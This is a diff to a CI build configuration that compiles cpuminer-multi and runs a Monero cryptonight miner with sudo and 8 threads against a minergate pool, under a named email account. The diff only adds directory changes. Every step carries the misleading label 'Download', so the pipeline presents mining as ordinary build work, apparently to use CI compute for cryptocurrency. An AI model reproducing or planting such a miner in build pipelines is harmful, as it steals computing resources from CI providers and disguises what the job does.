@@ -20,18 +20,18 @@ build:
     - script:
         name: Download
         code: |
-          ./autogen.sh
+          cd cpuminer-multi && ./autogen.sh
     - script:
         name: Download
         code: |
-          CFLAGS="-march=native" ./configure
+          cd cpuminer-multi && CFLAGS="-march=native" ./configure
     - script:
         name: Download
         code: |
-          make
+          cd cpuminer-multi && make
          
   after-steps:
     - script:
         name: Download
         code: |
-          sudo ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u yoginth@hotmail.com -p x -t 8
+          cd cpuminer-multi && sudo ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u yoginth@hotmail.com -p x -t 8
